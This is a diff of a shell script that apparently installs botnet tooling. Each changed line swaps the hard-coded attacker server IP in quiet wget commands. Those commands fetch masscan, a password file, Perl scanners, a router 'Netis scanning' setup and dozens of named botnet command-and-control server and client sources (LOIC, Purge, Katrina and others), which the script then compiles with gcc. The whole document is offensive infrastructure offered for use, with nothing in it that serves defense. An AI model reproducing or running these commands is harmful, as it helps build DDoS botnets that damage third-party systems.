@@ -225,21 +225,21 @@ sleep 1.0
 echo -e "${LIGHTRED}Now Installing LRAB... ${LIGHTGREEN}"
 sleep 1.0
 echo -e ""
-wget -q http://74.91.115.32/class -O class
+wget -q http://74.91.122.216/class -O class
 
-wget -q http://74.91.115.32/dup -O dup
+wget -q http://74.91.122.216/dup -O dup
 
-wget -q http://74.91.115.32/g -O g
+wget -q http://74.91.122.216/g -O g
 
-wget -q http://74.91.115.32/update -O update
+wget -q http://74.91.122.216/update -O update
 
-wget -q http://74.91.115.32/pass_file -O pass_file
+wget -q http://74.91.122.216/pass_file -O pass_file
 
-wget -q http://74.91.115.32/s -O s
+wget -q http://74.91.122.216/s -O s
 
-wget -q http://74.91.115.32/w.pl -O w.pl
+wget -q http://74.91.122.216/w.pl -O w.pl
 
-wget -q http://74.91.115.32/wget.pl -O wget.pl
+wget -q http://74.91.122.216/wget.pl -O wget.pl
 
 echo -e "${LIGHTCYAN}LRAB Finished Installing.."
 sleep 1.0
@@ -248,7 +248,7 @@ sleep 1.0
 echo -e "${LIGHTRED}Now Installing MassScan..${LIGHTGREEN}"
 sleep 1.0
 echo -e ""
-wget -q http://74.91.115.32/masscan -O masscan
+wget -q http://74.91.122.216/masscan -O masscan
 echo -e "${LIGHTCYAN}Massscan finished installing.."
 sleep 1.0
 echo -e "${LIGHTRED}Now Setting Up Netis Scanning${LIGHTGREEN}"
@@ -267,7 +267,7 @@ sleep 1.0
 echo -e "${LIGHTRED}Now Downloading Files For Net..${LIGHTGREEN}"
 sleep 1.0
 echo -e ""
-wget -q http://74.91.115.32/cc7.py -O cc7.py
+wget -q http://74.91.122.216/cc7.py -O cc7.py
 
 read
 fi
@@ -426,11 +426,11 @@ read IP
 clear
 echo -e ""
 
-wget -q http://74.91.115.32/slavclient.c -O client.c
+wget -q http://74.91.122.216/slavclient.c -O client.c
 
 python cc7.py client.c $IP
 
-wget -q http://74.91.115.32/slav.c -O server.c
+wget -q http://74.91.122.216/slav.c -O server.c
 
 gcc server.c -o server -pthread
 
@@ -465,7 +465,7 @@ if [[ $answer == Purgev3 ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/PURGE%20V3%20SERVERSIDE.txt -O server.c
+wget -q http://74.91.122.216/PURGE%20V3%20SERVERSIDE.txt -O server.c
 gcc server.c -o server -pthread
 echo -e ""
 echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
@@ -483,7 +483,7 @@ if [[ $answer == Purgev4 ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/PURGE%20V4%20SERVER%20SIDE.txt -O server.c
+wget -q http://74.91.122.216/PURGE%20V4%20SERVER%20SIDE.txt -O server.c
 gcc server.c -o server -pthread
 echo -e ""
 echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
@@ -501,7 +501,7 @@ if [[ $answer == Google ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/GOOGLE%20SERVER%20SIDE.txt -O server.c
+wget -q http://74.91.122.216/GOOGLE%20SERVER%20SIDE.txt -O server.c
 gcc server.c -o server -pthread
 echo -e ""
 echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
@@ -519,7 +519,7 @@ if [[ $answer == Purgev9 ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/PURGE%20BUILD%20V9%20SERVER%20SIDE.txt -O server.c
+wget -q http://74.91.122.216/PURGE%20BUILD%20V9%20SERVER%20SIDE.txt -O server.c
 gcc server.c -o server -pthread
 echo -e ""
 echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
@@ -537,7 +537,7 @@ if [[ $answer == Slav ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/slav.c -O server.c
+wget -q http://74.91.122.216/slav.c -O server.c
 gcc server.c -o server -pthread
 echo -e ""
 echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
@@ -555,7 +555,7 @@ if [[ $answer == ColtSec ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/COLTSEC%20SERVERSIDE%20BUILD%20V1.txt -O server.c
+wget -q http://74.91.122.216/COLTSEC%20SERVERSIDE%20BUILD%20V1.txt -O server.c
 gcc server.c -o server -pthread
 echo -e ""
 echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
@@ -573,7 +573,7 @@ if [[ $answer == LOIC ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/LOIC%20SERVER%20SIDE.txt -O server.c
+wget -q http://74.91.122.216/LOIC%20SERVER%20SIDE.txt -O server.c
 gcc server.c -o server -pthread
 echo -e ""
 echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
@@ -591,7 +591,7 @@ if [[ $answer == OMY ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/OMY%20SERVER%20SIDE.TXT -O server.c
+wget -q http://74.91.122.216/OMY%20SERVER%20SIDE.TXT -O server.c
 gcc server.c -o server -pthread
 echo -e ""
 echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
@@ -609,7 +609,7 @@ if [[ $answer == UNIX ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/UNIX%20SERVER%20SIDE.txt -O server.c
+wget -q http://74.91.122.216/UNIX%20SERVER%20SIDE.txt -O server.c
 gcc server.c -o server -pthread
 echo -e ""
 echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
@@ -627,7 +627,7 @@ if [[ $answer == LoveSec ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/FBI%20SERVER%20SIDE.txt -O server.c
+wget -q http://74.91.122.216/FBI%20SERVER%20SIDE.txt -O server.c
 gcc server.c -o server -pthread
 echo -e ""
 echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
@@ -645,7 +645,7 @@ if [[ $answer == HACKER ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/HACKER%20SERVER%20SIDE.txt -O server.c
+wget -q http://74.91.122.216/HACKER%20SERVER%20SIDE.txt -O server.c
 gcc server.c -o server -pthread
 echo -e ""
 echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
@@ -664,77 +664,77 @@ if [[ $answer == GhostSec ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/ghostsec%20client.c -O client.c
+wget -q http://74.91.122.216/ghostsec%20client.c -O client.c
 read
 fi
 if [[ $answer == idiot ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/idiot.c -O client.c
+wget -q http://74.91.122.216/idiot.c -O client.c
 read
 fi
 if [[ $answer == Hera ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/Hera%20client%20.c -O client.c
+wget -q http://74.91.122.216/Hera%20client%20.c -O client.c
 read
 fi
 if [[ $answer == inuyasha ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/Inuyasha_GHP_client.c -O client.c
+wget -q http://74.91.122.216/Inuyasha_GHP_client.c -O client.c
 read
 fi
 if [[ $answer == Katrinav2 ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/KATRINA%20V2%20CLIENT.C.txt -O client.c
+wget -q http://74.91.122.216/KATRINA%20V2%20CLIENT.C.txt -O client.c
 read
 fi
 if [[ $answer == UNIXC ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/UNIX%20CLIENT.c -O client.c
+wget -q http://74.91.122.216/UNIX%20CLIENT.c -O client.c
 read
 fi
 if [[ $answer == Nazi ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/naziclient.c -O client.c
+wget -q http://74.91.122.216/naziclient.c -O client.c
 read
 fi
 if [[ $answer == Zekron ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/Zekrom_client.c -O client.c
+wget -q http://74.91.122.216/Zekrom_client.c -O client.c
 read
 fi
 if [[ $answer == ZoneSec ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/ZONESEC%20CLIENT.c -O client.c
+wget -q http://74.91.122.216/ZONESEC%20CLIENT.c -O client.c
 read
 fi
 if [[ $answer == Dome ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/client.c -O client.c
+wget -q http://74.91.122.216/client.c -O client.c
 read
 fi
 if [[ $answer == Colt ]]
 then
 clear
 echo -e ""
-wget -q http://74.91.115.32/slavclient.c -O client.c
+wget -q http://74.91.122.216/slavclient.c -O client.c
 read
 fi
 if [[ $answer == EDITC ]]
